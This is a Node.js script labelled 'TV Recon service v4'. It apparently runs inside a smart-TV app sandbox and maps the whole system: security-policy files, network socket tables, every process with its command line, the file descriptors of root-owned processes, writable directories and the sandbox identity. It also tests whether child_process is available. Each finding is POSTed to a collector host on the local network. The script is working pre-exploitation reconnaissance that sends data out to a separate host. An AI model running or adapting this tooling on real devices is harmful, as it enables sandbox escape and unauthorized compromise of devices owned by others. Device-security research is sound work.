/* TV Recon service v4 — full system map. ES5. NO child_process anywhere
 * except the FINAL statement (the require kills this process — by design).
 * Everything else is read-only fs + http posts. */
'use strict';

var MAC = '192.168.86.86';
var MAC_PORT = 8080;

function post(tag, data) {
    try {
        var http = require('http');
        var body = JSON.stringify({ tag: tag, data: data });
        var req = http.request({
            host: MAC, port: MAC_PORT, path: '/report', method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
        });
        req.on('error', function () {});
        req.end(body);
    } catch (e) { try { console.log('post fail: ' + e); } catch (e2) {} }
}
function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.message ? e.message : String(e)); } }
function read(f, n) { return T(function () { return require('fs').readFileSync(f, 'utf8').slice(0, n || 8000); }); }
function ls(d) { return T(function () { return require('fs').readdirSync(d).slice(0, 200); }); }

console.log('TV Recon v4 starting');
var fs = require('fs');

/* 1. SMACK live rules (smackfs) — the actual access policy */
['/sys/fs/smackfs/accesses', '/sys/fs/smackfs/load2', '/sys/fs/smackfs/labels',
 '/sys/fs/smackfs/onlycap', '/sys/fs/smackfs/log', '/sys/fs/smackfs/un confined',
 '/etc/smack/accesses.d', '/etc/smack'].forEach(function (f) {
    post('smack', { path: f, content: read(f, 12000) });
});
/* dir listing of smackfs + /etc subdirs */
post('fs', { dir: '/sys/fs/smackfs', listing: ls('/sys/fs/smackfs') });
post('fs', { dir: '/etc', listing: ls('/etc') });

/* 2. complete socket maps */
post('net-unix', read('/proc/net/unix', 20000));
post('net-tcp', read('/proc/net/tcp', 12000));
post('net-udp', read('/proc/net/udp', 8000));
post('net-arp', read('/proc/net/arp', 4000));

/* 3. full process map */
var pids = T(function () { return fs.readdirSync('/proc').filter(function (x) { return /^[0-9]+$/.test(x); }); });
var procMap = [];
if (pids instanceof Array) {
    pids.forEach(function (pid) {
        var s = T(function () { return fs.readFileSync('/proc/' + pid + '/status', 'utf8'); });
        if (typeof s !== 'string') return;
        function g(re) { var m = s.match(re); return m ? m[1] : '?'; }
        procMap.push({
            pid: pid,
            name: g(/^Name:\s*(.*)/m),
            uid: g(/^Uid:\s*(\d+)/m),
            ppid: g(/^PPid:\s*(\d+)/m),
            cmd: T(function () { return fs.readFileSync('/proc/' + pid + '/cmdline', 'utf8').replace(/\0/g, ' ').slice(0, 110); })
        });
    });
}
post('procmap', { count: procMap.length, procs: procMap });
var roots = procMap.filter(function (p) { return p.uid === '0'; });
post('rootprocs', { count: roots.length, procs: roots });

/* 4. per-root-process open sockets (via fd links — cheap scan) */
roots.slice(0, 40).forEach(function (p) {
    var fds = T(function () { return fs.readdirSync('/proc/' + p.pid + '/fd').slice(0, 40); });
    post('rootfd', { pid: p.pid, name: p.name, fds: fds });
});

/* 5. writable tests */
var wr = {};
['/tmp', '/home/owner/share/tmp/sdk_tools', '/home/owner/share/tmp', '/home/owner',
 '/dev/shm', '/run/user/5001', '/opt/usr/home/owner', '/home/owner/data',
 '/home/owner/content', '/home/owner/.cache', '/home/owner/apps_rw'].forEach(function (d) {
    wr[d] = T(function () {
        var t = d + '/.__tvr';
        fs.writeFileSync(t, 'x'); fs.unlinkSync(t); return 'WRITE_OK';
    });
});
post('writable', wr);

/* 6. who are we / sandbox boundaries */
post('sandbox', {
    uid: T(function () { return process.getuid(); }),
    gid: T(function () { return process.getgid(); }),
    groups: T(function () { return process.groups; }),
    umask: T(function () { return process.umask(); }),
    cwd: process.cwd(),
    envHOME: process.env.HOME
});

/* 7. interesting trees */
['/opt', '/opt/usr', '/opt/usr/apps', '/opt/etc', '/usr/share', '/usr/share/chromium-efl',
 '/usr/share/chromium-efl/upgrade', '/var', '/lib', '/usr/lib'].forEach(function (d) {
    post('fs', { dir: d, listing: ls(d) });
});

/* 8. LAST — child_process availability. The require may hard-kill this
 * process (v3 died here). Everything above has already been posted. */
post('child_process', { available: T(function () { require('child_process'); return 'YES'; }) });
post('final', 'survived child_process require');
throw new Error('RECON_CYCLE_COMPLETE');